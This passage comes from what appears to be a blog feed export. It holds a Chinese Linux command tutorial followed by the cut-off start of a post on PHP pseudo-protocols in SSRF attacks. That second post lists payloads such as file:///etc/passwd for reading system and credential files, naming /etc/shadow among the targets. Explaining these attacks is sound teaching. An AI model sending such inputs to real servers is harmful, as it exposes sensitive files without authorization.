dira将当前目录下filea移动到dira子目录<br>如：mv filea ~ 将当前目录下filea移动家目录<br>如：mv ~&#x2F;filea ..将家目录下的fila移动到上一个路径</p><hr><p>cp ：复制文件(目录)<br>&#x3D;&#x3D;复制 cp -r 目录 -v 详细 -f 强制 -n 静默<br>​<br>1） cp 源文件名 目标文件名<br>举例：<br> cp File1 file2将当前目录下的文件File1拷贝成file2</p><p>2） cp 源文件名 目标目录名<br>举例：<br>cp file2 dira&#x2F;将当前目录下的文件file2拷贝到dira子目录<br>​<br>3） cp 源目录名 目标目录名<br>举例：<br>cp -r dira dirb复制dira目录下的所有内容到dirb。其中,-r参数是递归复制<br>cp -i file2 dira如果dira目录下面有同名的file2，加入-i参数就会要求你确认是否覆盖同名的文件</p><hr><p>mkdir : 创建空目录<br>mkdir dir1<br>创建两个目录：<br>mkdir &#x2F;home&#x2F;dir2 &#x2F;home&#x2F;dir3<br>mkdir &#x2F;home&#x2F;{dir4,dir5}<br>mkdir -v &#x2F;home&#x2F;{dir6,dir7} #-v ：verbose 冗长的。显示创建时的详细信息<br>mkdir -p &#x2F;home&#x2F;dir8&#x2F;111&#x2F;222 #-p 创建连级目录，一级一级的创建<br>rmdir : 删除空目录<br>&#x3D;&#x3D;删除 rm -r 递归删除目录 -f force强制 -v 详细过程  *通配符</p><p>​—</p><p>rm:删除目录及内容<br>rm -rf :删除所有<br>touch : 创建空文件<br>[root@linux-server ~]# touch file1.txt &#x2F;&#x2F;无则创建，如果存在修改时间<br>[root@linux-server ~]# touch &#x2F;home&#x2F;file10.txt<br>[root@linux-server ~]# touch &#x2F;home&#x2F;{zhuzhu,gougou} &#x2F;&#x2F;{}集合<br>[root@linux-server ~]# touch &#x2F;home&#x2F;file{1..20} &#x2F;&#x2F;批量创建</p><hr><p>echo : 写入<br>echo 加内容 &gt; 加文件名 #覆盖:把之前的内容替换掉<br>​echo 123 &gt; a.txt<br>echo 加内容 &gt;&gt; 加文件名  #追加:保留之前的内容,在后面添加新内容<br>​echo 345345 &gt;&gt; a.txt<br>​当使用echo 123 &gt;&gt; a.txt 这个命令的时候在文件不存在的时候会创建该文件并将内容追加到改文件中</p><hr><p>stat : 详细查看文件访问时间等信息<br>root@localhost ~] #stat file文件: “file”<br>大小 : 24     块 ：8    IO块 : 4096  普通文件<br>设备 : fdooh&#x2F;64768d   Inode : 35493573  硬链接∶1<br>权限 : ( 0644&#x2F;- rw- r–r– )  Uid : ( 0&#x2F; root)  Gid : (  0&#x2F;  root）<br>环境 : unconfined_u: object_r: admin_home_t: so<br>最近访问:2023-04-05 11:31:37.678858345 +080O<br>最近更改:2023-04-05 11:31:35.590867350 +080O<br>最近改动:2023-04-05 11:31:53.385790608 +080O<br>创建时间: -</p><hr><p>awk：以关键字分隔查看内容<br>awk -F “:” ‘{print $2}’ 文件路径<br>例如:<br>[root@localhost ~]# cat &#x2F;home&#x2F;a<br>aaaa:skas:asdd<br>[root@localhost ~]# awk -F “:” ‘{print $2}’ &#x2F;home&#x2F;a<br>skas</p><hr><p>sort: 排序<br>[root@localhost ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd #以: 分隔，将第三列按字数升序<br>[root@localhost ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd -r #以: 分隔，将第三列按字数降序<br>[root@localhost ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd |head #以: 分隔，将第三列按字数升序看前十行<br>[root@localhost ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd |tail #以: 分隔，将第三列按字数升序看后十行<br>参数详解：<br>sort 排序，默认升序<br>-t 指定分隔符<br>-k 指定列<br>-n 按数值<br>-r 降序</p><hr><p>wc :统计数据<br>wc -l :统计有多少行数据</p><hr><p>find : 针对文件属性查找文件<br>-name : 按文件名查找<br>[root@localhost ~]# find &#x2F;var&#x2F;cache&#x2F;yum&#x2F; -name “<em>.rpm” #查找&#x2F;var&#x2F;cache&#x2F;yum下以.rpm结尾的文件<br>[root@localhost ~]# find &#x2F;etc -iname “Ifcfg-ens33”     #-i忽略大小写<br>-size : 按文件大小查找<br>[root@localhost ~]# find &#x2F;etc -size +5M  #查找大于5M<br>[root@localhost ~]# find &#x2F;etc -size 5M  #等于5M<br>[root@localhost ~]# find &#x2F;etc -size -5M  #小于5M<br>​<br>[root@localhost ~]# find &#x2F; -size +3M -a -size -5M   #查找&#x2F;下面大于3M而且小于5M的文件 —a:and<br>[root@localhost ~]# find &#x2F; -size -1M -o -size +8M   #查找&#x2F;下面小于1M或者大于8M的文件 -o:or<br>[root@localhost ~]# find &#x2F; -size -3M -a -name “</em>.txt” #查找&#x2F;下面小于3M而且名字是以.txt结尾的文件<br>-atime&#x2F;mtime&#x2F;ctime : 按时间查找<br>-atime &#x3D; access访问时间            #单位是 天<br>-mtime &#x3D; modify改变时间 内容修改时间会改变<br>-ctime &#x3D; change修改时间 属性修改时间会改变<br>​<br>-amin #分钟<br>-mmin<br>-cmin<br>[root@localhost ~]# find &#x2F;opt -mtime +5  #修改时间5天之前<br>[root@localhost ~]# find &#x2F;opt -atime -1  #访问时间1天之内<br>[root@localhost ~]# find . -amin +1    #访问时间在1分钟之前<br>-type : 按文件类型查找<br>-type f:普通文件<br>-type l:链接文件<br>-type d:目录文件<br>-type b:设备文件<br>[root@localhost ~]# find &#x2F;dev -type f<br>-perm : 按文件权限<br>[root@localhost ~]# find . -perm 644     #查找当前目录下权限是644的文件或目录<br>[root@localhost ~]# find &#x2F;usr&#x2F;bin -perm -4000 #包含set uid<br>-exec&#x2F;xargs : 参数传递<br>-exec:参数是一个一个传递的，传递一个参数执行一次命令。<br>[root@localhost ~]# find &#x2F;etc -name “ifcfg*” -exec cp -rf {} &#x2F;tmp ;   #exec命令查找带ifcfg开头的文件复制到tmp下<br>[root@localhost ~]# find &#x2F;home&#x2F; -name test* -exec tar cvzf test.tar.gz {} ; #由于-exec是一次一次执行，所以会产生覆盖导致最终只会产生一个tar.gz文件，故需要将 “;” 改成 “+;”<br>xargs:将前一个命令的标准输出传递给下一个命令，作为它的参数转换成下一个命令的参数列表。<br>[root@localhost ~]# find &#x2F;home&#x2F; -name “test*” | xargs -i cp {} &#x2F;tmp&#x2F; #找到之后删除处理xargs 参数传递<br>区别：<br>1、exec每处理一个文件或者目录，它都需要启动一次命令，效率不好;<br>2、xargs不能操作文件名有空格的文件；</p><hr><p>ping : 检查主机是否可以联网<br>[root@linux-server ~]# ping <a class="link"   href="http://www.baidu.com/" >www.baidu.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> #ping命令，可以检查主机是否可以联网<br>PING <a class="link"   href="http://www.a.shifen.com/" >www.a.shifen.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> (183.232.231.174) 56(84) bytes of data.<br>​<br>[root@linux-server ~]# ping -c 3 <a class="link"   href="http://www.baidu.com/" >www.baidu.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>-c：指定次数<br>ntp ：实现服务器对时<br>[root@localhost ~]# yum install ntp<br>[root@localhost ~]# ntpdate ntp.aliyun.com<br>[root@localhost ~]# ntpdate cn.pool.ntp.org #cn.pool.ntp.org是ntp网络授时组织的中国授时源</p><hr><p>which ：查找命令<br>[root@localhost ~]# which cd<br>&#x2F;usr&#x2F;bin&#x2F;cd</p><hr><p>查看文件内容<br>cat：查看一个文件的全部内容<br>cat -n : 显示行号<br>cat -A : 显示控制字符</p><hr><p>head ：头部<br>[root@linux-server ~]# head &#x2F;etc&#x2F;passwd &#x2F;&#x2F;默认查看前十行<br>[root@linux-server ~]# head -2 &#x2F;etc&#x2F;passwd &#x2F;&#x2F;查看前两行<br>tail ：尾部<br>[root@linux-server ~]# tail &#x2F;etc&#x2F;passwd &#x2F;&#x2F;默认查看文件的后十行<br>[root@linux-server ~]# tail -1 &#x2F;etc&#x2F;passwd &#x2F;&#x2F;查看文件最后一行<br>[root@linux-server ~]# tail &#x2F;var&#x2F;log&#x2F;messages<br>[root@linux-server ~]# tail -f &#x2F;var&#x2F;log&#x2F;secure &#x2F;&#x2F;-f 动态查看文件的尾部<br>[root@linux-server ~]# tailf &#x2F;var&#x2F;log&#x2F;secure &#x2F;&#x2F;功能同上</p><hr><p>grep：过滤关键字<br>过滤文件中带有root的内容：<br>[root@linux-server ~]# grep ‘root’ &#x2F;etc&#x2F;passwd<br>过滤以root开头的行：^ –以什么开头<br>[root@linux-server ~]# grep ‘^root’ &#x2F;etc&#x2F;passwd<br>过滤以bash结尾的行：$ –以什么结尾<br>[root@linux-server ~]# grep ‘bash$’ &#x2F;etc&#x2F;passwd</p><hr><p>less ：分页显示<br>[root@linux-server ~]# less &#x2F;etc&#x2F;makedumpfile.conf.sample<br>1.空格键是翻页 回车键是翻行<br>2.上下箭头可以来回翻<br>3.&#x2F;关键字  #搜索 (n按关键字往下翻 N按关键字往上翻)<br>4.快捷键:q -quit 退出<br>more ：分页显示文件内容<br>[root@localhost ~]# more 文件名<br>空格键是翻页 回车键是翻行</p><h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><p>useradd &#x2F; userdel &#x2F; usermod  ： 用户管理<br>-M : 不创建用户主目录<br>-r : 创建系统用户<br>​<br>[root@linux-server ~]# useradd user02 -u 503 &#x2F;&#x2F;指定uid为503<br>[root@linux-server ~]# useradd user05 -s &#x2F;sbin&#x2F;nologin &#x2F;&#x2F;创建用户并指定shell<br>[root@linux-server ~]# useradd user07 -G it,fd &#x2F;&#x2F;创建用户，指定附加组<br>[root@linux-server ~]# useradd -g 1003 user8 #指定用户的主属组为1003组。<br>[root@linux-server ~]# useradd user10 -u 4000 -s &#x2F;sbin&#x2F;nologin<br>userdel -r ：完全删除用户</p><p>1.修改用户名：<br>-l<br>[root@linux-server ~]# usermod -l NEW_name user8<br>[root@linux-server ~]# id user8<br>id: user8：无此用户</p><p>2.修改GID：<br>-g<br>[root@linux-server ~]# id user10<br>uid&#x3D;1000(user10) gid&#x3D;1000(tom) groups&#x3D;1000(tom)<br>[root@linux-server ~]# usermod user10 -g new_gid #gid需要提前存在</p><p>3.修改UID<br>-u<br>[root@linux-server ~]# usermod -u new_id jack<br>[root@linux-server ~]# id jack<br>uid&#x3D;1005(jack) gid&#x3D;1004(jack) groups&#x3D;1004(jack)</p><p>4.修改用户的登录shell<br>-s<br>[root@linux-server ~]# usermod -s &#x2F;sbin&#x2F;nologin user07 #修改用户的登录shell<br>groupadd &#x2F; groupmod &#x2F; groupdel：组管理<br>[root@linux-server ~]# groupadd hr &#x2F;&#x2F;创建一个用户组叫hr<br>[root@linux-server ~]# groupadd net01 -g 2000 &#x2F;&#x2F;创建组叫net01，并指定gid为2000<br>[root@linux-server ~]# grep ‘net01’ &#x2F;etc&#x2F;group &#x2F;&#x2F;查看&#x2F;etc&#x2F;group中组net01信息<br>net01:x:2000:<br>[root@linux-server ~]#groupmod 参数 组名<br>-g：修改组的gid<br>-n：修改组名<br>[root@linux-server ~]#groupmod -g 2000 grp1<br>[root@linux-server ~]#groupmod -n 新组名 grp1<br>[root@linux-server ~]# groupdel net01 #删除组net01<br>注意：用户的主属组不能删除<br>gpasswd : 组成员管理<br>注意：只针对已存在的用户</p><hr><p>1.给组添加账户<br>-a<br>[root@linux-server ~]# gpasswd -a user10 grp2<br>Adding user user10 to group grp2<br>2.同时添加多个用户到组<br>-M:members成员的缩写<br>[root@linux-server ~]# gpasswd -M tom,alice it （<strong>会覆盖该组之前的组成员</strong>）<br>3.从组删除用户<br>-d<br>[root@linux-server ~]# gpasswd -d user07 hr</p><h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><p>chown:改变文件或目录的所属主以及所属组<br>chown :（chown 属主.属组 文件名）<br>​<br>[root@linux-server ~]# chown alice.hr file1.txt &#x2F;&#x2F;修改属主、属组<br>[root@linux-server ~]# chown tom file1.txt &#x2F;&#x2F;修改属主<br>[root@linux-server ~]# chown .it file1.txt &#x2F;&#x2F;只改属组<br>​<br>[root@linux-server ~]# chown -R alice.hr dir1 &#x2F;&#x2F;递归修改—针对目录<br>chmod : 更改权限<br>基本权限类型：<br>读 ：r —-&gt; 4<br>写 ：w —-&gt; 2<br>执行: x(exec) —–&gt; 1<br>​<br>[root@linux-server ~]# chmod -R a&#x3D;rwx dir1 &#x2F;&#x2F;递归更改目录及其中文件的权限</p><p>a. 使用符号*<br>​[root@linux-server ~]# chmod u+x file1.txt  &#x2F;&#x2F;属主增加执行<br>[root@linux-server ~]# chmod a&#x3D;rwx file1.txt &#x2F;&#x2F;所有人等于读写执行<br>[root@linux-server ~]# chmod a&#x3D;- file1.txt &#x2F;&#x2F;所有人都没有权限<br>[root@linux-server ~]# chmod ug&#x3D;rw,o&#x3D;r file1.txt &#x2F;&#x2F;属主属组等于读写，其他人只读<br>[root@linux-server ~]# ll<br>-rw-rw-r–. 1 tom it  0 Nov 1 15:30 file1.txt</p><p>b.使用数字*<br>​[root@linux-server ~]# chmod 644 file1.txt<br>[root@linux-server ~]# ll file1.txt<br>-rw-r–r–. 1 tom it 0 Nov 1 15:30 file1.txt<br>​<br>[root@linux-server ~]# chmod 755 file1.txt<br>[root@linux-server ~]# ll<br>-rwxr-xr-x 1 root root 0 Jul 23 22:40 file1.txt<br>​<br>[root@linux-server ~]# chmod 521 file1.txt<br>[root@linux-server ~]# ll<br>-r-x-w—x 1 root root 0 Jul 23 22:40 file1.txt</p><hr><p>chgrp : 更改属组<br>[root@linux-server ~]# chgrp hr file1.txt &#x2F;&#x2F;更改文件file1.txt所属组为hr<br>​<br>[root@linux-server ~]# chgrp -R hr dir1 &#x2F;&#x2F;递归更改目录dir1及其中文件所属组为hr </p><hr><p>ACL权限<br>getfacl ：查看文件或目录当前设定的 ACL 权限信息<br>[root@localhost ~]# getfacl 文件名<br>setfacl ：直接设定用户或群组对指定文件的访问权限<br>setfacl -m：给用户或群组添加 ACL 权限<br>chattr：文件隐藏属性</p><hr><p>[root@linux-server ~]# touch file1 file2 file3<br>1.查看文件属性<br>[root@linux-server ~]# lsattr file1 file2 file3  #查看文件隐藏属性<br>—————- file1<br>—————- file2<br>—————- file3<br>2.设置权限<br>[root@linux-server ~]# chattr +a file1 #不允许修改，只允许追加<br>[root@linux-server ~]# chattr +i file2 #不允许做任何操作<br>[root@linux-server ~]# chattr +A file3<br>[root@linux-server ~]# lsattr file1 file2 file3<br>—–a———- file1<br>—-i———– file2<br>——-A——– file3<br>​<br>i:即Immutable，系统不允许对这个文件进行任何的修改<br>a：即Append Only，系统只允许在这个文件之后追加数据，不允许任何覆盖或截断这个文件<br>A：即Atime，告诉系统不要修改对这个文件的最后访问时间<br>​<br>取消权限<br>[root@linux-server ~]# chattr -a file1<br>[root@linux-server ~]# chattr -i file2<br>管道与重定向<br>awk：过滤并输出文件中符合条件的内容<br>awk -F “分隔符” ‘{print $第几列}’<br>[root@localhost ~]# cat &#x2F;home&#x2F;aaa<br>sdjlasjlk<br>asldjasjlkdasjl<br>[root@localhost ~]# grep ‘sd’ &#x2F;home&#x2F;aaa | awk -F “j” ‘{print $2}’ #过滤aaa中的一行内容然后将结果通过管道传递给                  awk，过滤并输出以j为分隔符的第二列内容<br>las<br>sort: 排序<br>[<a class="link"   href="mailto:&#114;&#x6f;&#x6f;&#x74;&#x40;&#113;&#102;&#x65;&#x64;&#x75;&#x2e;&#x63;&#x6f;&#109;" >&#114;&#x6f;&#x6f;&#x74;&#x40;&#113;&#102;&#x65;&#x64;&#x75;&#x2e;&#x63;&#x6f;&#109; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd #以: 分隔，将第三列按字数升序<br>[<a class="link"   href="mailto:&#x72;&#x6f;&#111;&#116;&#64;&#x71;&#102;&#x65;&#x64;&#117;&#46;&#x63;&#111;&#x6d;" >&#x72;&#x6f;&#111;&#116;&#64;&#x71;&#102;&#x65;&#x64;&#117;&#46;&#x63;&#111;&#x6d; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd -r #以: 分隔，将第三列按字数降序<br>[<a class="link"   href="mailto:&#114;&#111;&#111;&#116;&#x40;&#113;&#102;&#x65;&#100;&#117;&#46;&#99;&#111;&#109;" >&#114;&#111;&#111;&#116;&#x40;&#113;&#102;&#x65;&#100;&#117;&#46;&#99;&#111;&#109; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd |head #以: 分隔，将第三列按字数升序看前十行<br>[<a class="link"   href="mailto:&#x72;&#x6f;&#111;&#116;&#x40;&#113;&#102;&#101;&#100;&#x75;&#x2e;&#x63;&#x6f;&#109;" >&#x72;&#x6f;&#111;&#116;&#x40;&#113;&#102;&#101;&#100;&#x75;&#x2e;&#x63;&#x6f;&#109; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ~]# sort -t”:” -k3 -n &#x2F;etc&#x2F;passwd |tail #以: 分隔，将第三列按字数升序看后十行<br>参数详解：<br>sort 排序，默认升序<br>-t 指定分隔符<br>-k 指定列<br>-n 按数值<br>-r 降序<br>head 默认输出前十行<br>tail 默认输出后十行<br>xargs：参数传递<br>对与 ls cp rm mv命令，管道不能执行。所以通过xargs实现。<br>​<br> 语法:<br> cat a.txt | xargs -i cp {} &#x2F;目录<br> {}:前面传过来的内容<br> -i ：为了让大括号生效<br> 目录时 -r<br> 解释：前面传过来的东西交给大括号</p><p> cat file.txt |xargs ls -l<br> 前面是目录或者目录的路径。 ls - l 后面可以不加大括号，直接执行。</p><p>[<a class="link"   href="mailto:&#114;&#x6f;&#111;&#116;&#x40;&#x71;&#x66;&#101;&#100;&#117;&#46;&#x63;&#111;&#109;" >&#114;&#x6f;&#111;&#116;&#x40;&#x71;&#x66;&#101;&#100;&#117;&#46;&#x63;&#111;&#109; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ~]# touch &#x2F;home&#x2F;file{1..5}<br>[<a class="link"   href="mailto:&#114;&#111;&#111;&#116;&#x40;&#113;&#x66;&#x65;&#x64;&#x75;&#46;&#99;&#x6f;&#x6d;" >&#114;&#111;&#111;&#116;&#x40;&#113;&#x66;&#x65;&#x64;&#x75;&#46;&#99;&#x6f;&#x6d; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ~]# # cat files.txt | xargs -i cp -rvf {} &#x2F;tmp&#x2F;<br>‘&#x2F;home&#x2F;file1’ -&gt; ‘&#x2F;tmp&#x2F;file1’<br>‘&#x2F;home&#x2F;file2’ -&gt; ‘&#x2F;tmp&#x2F;file2’<br>‘&#x2F;home&#x2F;file3’ -&gt; ‘&#x2F;tmp&#x2F;file3’<br>‘&#x2F;home&#x2F;file4’ -&gt; ‘&#x2F;tmp&#x2F;file4’<br>‘&#x2F;home&#x2F;file5’ -&gt; ‘&#x2F;tmp&#x2F;file5’</p><h2 id="软件管理"><a href="#软件管理" class="headerlink" title="软件管理"></a>软件管理</h2><p>rpm：管理软件<br>rpm -ivh 软件包：安装软件<br>-i install 安装<br>-vh verbose human 人性化显示安装过程<br>-u upgrade 升级<br>rpm -q{a,l,f} 软件包：查询<br>＝＝查询<br>(从本地的rpm数据库)<br>-q query （查询）<br>-l list （列出）<br>-f file<br>-a all<br>rpm -ql 软件包名 ：列出某个软件包安装后，生成了哪些文件以及文件对应的存储位置<br>​<br>[root@linux-server ~]# rpm -qa | grep 软件名 # 查找软件是否安装<br>[root@linux-server ~]# rpm -ql httpd     #查询http安装的文件<br>[root@linux-server ~]# rpm -qf &#x2F;usr&#x2F;share&#x2F;httpd&#x2F;noindex  #查询该文件属于哪个包，只能查询已经安装好的软件<br>rpm -e：删除软件<br>语法：# rpm -e 软件名称<br>-e erase的意思<br>[root@linux-server ~]# rpm -e httpd<br>yum：管理软件<br>清理yum缓存:（元数据建立）<br>yum clean all</p><p>缓存软件包信息:<br> 提高搜索&#x2F;安装软件的速度<br>yum makecache<br>查询yum源信息:  #也具有缓存功能<br>yum repolist </p><p>查看命令属于哪个软件<br>yum provides rz </p><p>查看系统已经安装好的软件和没有安装的软件（源里存在即可查到）:<br>yum list</p><p>安装软件:<br>yum install 软件名称 </p><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><p>ps aux&#x2F;ps -ef：静态查看进程<br>[root@linux-server ~]# ps aux </p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER   PID %CPU %MEM VSZ RSS TTY  STAT START TIME COMMAND</span><br><span class="line">============================================================================</span><br></pre></td></tr></table></figure></div><p>USER:  #运行进程的用户<br>PID： #进程ID<br>%CPU: #CPU占用率<br>%MEM: #内存占用率<br>VSZ  进程占用的虚拟内存大小 ，一般以B为单位<br>RSS  占用的物理内存大小<br>TTY  终端 （？表示不占用终端） （? 表示没有占用终端）<br>STAT： #进程状态 —了解<br>START: #进程的启动时间<br>TIME： #进程占用CPU的总时间<br>COMMAND： #进程文件，进程名<br>[root@linux-server ~]# ps aux | less<br>参数解释：<br>ps :process nsapashot<br>a 只能查看系统里面运行的所有终端进程<br>u 显示进程拥有者<br>x 显示系统内所有进程<br>f 显示进程之间的父子关系<br>[root@linux-server ~]# ps -ef<br>参数解释：<br>-e 显示所有进程<br>-l 长格式显示<br>-f 完整格式<br>cat … ：查看单个PID<br>[root@linux-server ~]# systemctl start httpd #启动<br>[root@linux-server ~]# cat &#x2F;var&#x2F;run&#x2F;httpd&#x2F;httpd.pid<br>1043<br>ps aux | grep ‘进程名’：查看指定PID<br>[root@linux-server ~]# ps aux | grep sshd<br>root       1043  0.0  0.2 105996  4120 ?        Ss   01:32   0:00 &#x2F;usr&#x2F;sbin&#x2F;sshd -D</p><hr><p>netstat -tlanp：查看端口<br>ip地址： 为了确定一个服务器在互联网的位置<br>服务端口： 为了确定一个服务在服务器中位置<br>#查网络进程和正在监听的端口<br>[root@linux-server ~]# netstat -tlanp    (该命令对应的包名：net-tools)<br>参数详解：<br>-a  显示全部的进程<br>-u  显示udp<br>-n  以数字的新式显示协议名称<br>-t   tcp<br>-p：显示进程的名称和pid<br>-l :只显示正在被监听的端口</p><p>[root@localhost ~]# netstat -alntp | grep ‘sshd’（可跟端口号&#x2F;进程名&#x2F;PID）       ##可查看到sshd服务的端口号是22<br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1106&#x2F;sshd<br>tcp        0      0 192.168.201.142:22      192.168.201.1:10025     ESTABLISHED 17303&#x2F;sshd: root@no<br>tcp        0      0 192.168.201.142:22      192.168.201.1:10024     ESTABLISHED 17034&#x2F;sshd: root@no<br>tcp      104      0 192.168.201.142:22      192.168.201.1:9813      ESTABLISHED 1820&#x2F;sshd: root@pts<br>tcp6       0      0 :::22                   :::*                    LISTEN      1106&#x2F;sshd<br>lsof -i:端口号  ：根据端口号查询进程<br>[root@linux-server ~]# yum install lsof  #安装软件包<br>[root@linux-server ~]# lsof -i:80   #端口号，这能查看带端口的进程<br>COMMAND   PID   USER   FD   TYPE  DEVICE SIZE&#x2F;OFF NODE NAME<br>httpd   64249   root    4u  IPv6 1373628      0t0  TCP *:http (LISTEN)<br>top：动态查看进程<br>[root@linux-server ~]# top  #动态显示信息，三秒刷新一次。</p><hr><p>kill&#x2F;pkill：进程控制<br>kill,pkill<br>语法： kill 信号 PID   #信号也是进程间通信的一种方式<br>     pkill 信号 进程名<br>[root@linux-server ~]# kill -l   #查看所有信号<br>-1   HUP  重新加载进程或者重新加载配置文件,PID不变<br>-9   KILL 强制杀死<br>-15  TERM 正常杀死(这个信号可以默认不写)<br>-18  CONT 激活进程<br>-19  STOP 挂起进程</p><p>进程状态解释–了解：<br>+：表示运行在前台的进程组<br>S+：休眠状态<br>T+：暂停，挂起状态<br>s：父进程<br>jobs：作业控制<br>sleep 工作号 &amp; :让命令或程序后台运行<br>sleep 工作号 #ctrl Z   :把程序从前台放到后台并暂停<br>jobs   :查看后台工作号<br>bg %工作序号    :让暂停的程序在后台运行<br>fg %工作序号   :将后台的程序调到前台</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>uptime : 查看当前CPU负载<br>free -m : 查看内存使用情况<br>查看系统版本和内核<br>[root@linux-server ~]# cat &#x2F;etc&#x2F;redhat-release  #查看版本<br>CentOS Linux release 7.4.1708 (Core)<br>[root@linux-server ~]# uname -a #看查正在运行的内核版本<br>Linux linux-server 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64 x86_64 x86_64 GNU&#x2F;Linux<br>[root@linux-server ~]# uname -r  #查看内核版本<br>3.10.0-693.el7.x86_64<br>修改主机名<br>[root@linux-server ~]# hostnamectl set-hostname  xxxx   #主机名，修改完之后断开与终端连接，然后在重新连接即可。<br>查看主机名<br>[root@linux-server ~]# hostname</p><p>vim &#x2F;etc&#x2F;hostname   #直接更改hostname，然后reboot重启<br>lrzsz : 上传下载<br>yum install -y lrzsz<br>上传<br>rz<br>下载<br>sz 文件</p><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>at : 一次调度执行<br>at使用规则<br>[root@linux-server ~ ]# yum -y install at<br>[root@linux-server ~ ]# systemctl status atd    #查看启动状态<br>[root@linux-server ~ ]# systemctl start atd#首先要启动服务<br>方式一：<br>[root@linux-server ~ ]# at now +1min    #一分钟后开始执行<br>at&gt; useradd uuuu<br>at&gt; <EOT>     #Ctrl+D<br>job 1 at Sat Mar 21 22:34:00 2015<br>方式二：<br>[root@linux-server ~ ]# vim at.jobs<br>useradd u99<br>[root@linux-server ~ ]# at 20:33 &lt; at.jobs   #在20：33执行计划任务</p><p>at是以输入重定向方式将文件中的内容输入给at调度执行任务，所以不需要执行文件，即不需要给予执行权限。<br>atq : 查看一次性计划任务<br>2Tue Aug  9 14:29:00 2022 a root<br>atrm : 删除一次性计划任务</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># atrm  计划任务序号</span><br></pre></td></tr></table></figure></div><p>cron ：循环调度执行  用户级<br>crontab -l&#x2F;&#x2F;列出当前用户的计划任务<br>crontab -r&#x2F;&#x2F;删除当前用户所有的计划任务<br>crontab -e&#x2F;&#x2F;编辑当前用户的计划任务<br>crontab -u username     &#x2F;&#x2F;（仅管理员可使用）管理其他用户的计划任务</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="linux" scheme="http://example.com/categories/linux/"/>
    
    
    <category term="linux" scheme="http://example.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>常见的php伪协议</title>
    <link href="http://example.com/2025/01/02/web/ssrf/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>http://example.com/2025/01/02/web/ssrf/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</id>
    <published>2025-01-02T13:10:52.000Z</published>
    <updated>2025-03-30T08:46:25.590Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="1-file-x2F-x2F-协议"><a href="#1-file-x2F-x2F-协议" class="headerlink" title="1. file:&#x2F;&#x2F; 协议"></a>1. <strong>file:&#x2F;&#x2F; 协议</strong></h3><h4 id="概述："><a href="#概述：" class="headerlink" title="概述："></a><strong>概述</strong>：</h4><p><code>file://</code> 是一种用于访问本地文件系统的协议。在 URL 中，它指示访问本地计算机的文件。例如：</p><ul><li><code>file:///etc/passwd</code>（Linux系统中）</li><li><code>file:///C:/Windows/System32/drivers/etc/hosts</code>（Windows系统中）</li></ul><p>它是一个用于本地文件的 URI 协议，表示在本地计算机上读取文件的路径。</p><h4 id="常见用途："><a href="#常见用途：" class="headerlink" title="常见用途："></a><strong>常见用途</strong>：</h4><ul><li><strong>文件访问</strong>：它允许直接访问本地文件系统中的文件。这个协议通常用于 Web 浏览器中查看本地文件。</li><li><strong>浏览器功能</strong>：某些浏览器允许用户输入 <code>file://</code> URL 来查看本地文件，而不通过HTTP或FTP。</li></ul><h4 id="攻击场景："><a href="#攻击场景：" class="headerlink" title="攻击场景："></a><strong>攻击场景</strong>：</h4><p>如果 Web 应用没有正确验证和过滤用户输入，攻击者可能构造类似于 <code>file://</code> 的路径来访问本地敏感文件。典型攻击案例包括：</p><ul><li><strong>读取敏感文件</strong>：攻击者可以提交类似 <code>file:///etc/passwd</code>（Linux）或 <code>file:///C:/Windows/System32/config/systemprofile</code>（Windows）这样的路径来读取本地敏感文件。</li><li><strong>SSRF（Server-Side Request Forgery）攻击</strong>：攻击者通过利用 SSRF 漏洞，将服务器请求引导到本地文件系统，读取服务器上的敏感数据，如 <code>/etc/shadow</code>、数据库配置文件等。</li></ul><hr><h3 id="2-dict-x2F-x2F-协议"><a href="#2-dict-x2F-x2F-协议" class="headerlink" title="2. dict:&#x2F;&#x2F; 协议"></a>2. <strong>dict:&#x2F;&#x2F; 协议</strong></h3><h4 id="概述：-1"><a href="#概述：-1" class="headerlink" title="概述："></a><strong>概述</strong>：</h4><p><code>dict://</code> 协议用于连接到 <strong>Dictionary Protocol</strong> 服务。字典协议（DICT）是一种用于访问在线字典的协议，它允许客户端通过互联网查询词汇定义。<code>dict://</code> 协议的 URL 